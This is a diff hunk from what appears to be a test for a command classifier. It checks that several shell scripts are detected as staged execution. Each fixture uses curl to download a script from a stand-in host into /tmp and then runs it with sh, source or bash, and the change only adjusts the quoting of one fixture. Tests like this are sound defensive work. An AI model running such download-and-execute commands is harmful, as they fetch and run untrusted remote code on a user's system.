@@ -25,7 +25,7 @@ test("a path glued to a clustered output flag is the same staged execution", () 
     // real client, which wrote 577 bytes and exited 0.
     "#!/bin/sh\ncurl -fsSLo/tmp/i.sh https://x.example/i.sh\nsh /tmp/i.sh\n",
     "#!/bin/sh\ncurl -sSLo/tmp/i.sh https://x.example/i.sh\n. /tmp/i.sh\n",
-    "#!/bin/sh\ncurl -fsSLo\"/tmp/i.sh\" https://x.example/i.sh\nbash /tmp/i.sh\n",
+    '#!/bin/sh\ncurl -fsSLo"/tmp/i.sh" https://x.example/i.sh\nbash /tmp/i.sh\n',
   ])
     expect({ text, categories: categories(text) }).toEqual({
       text,
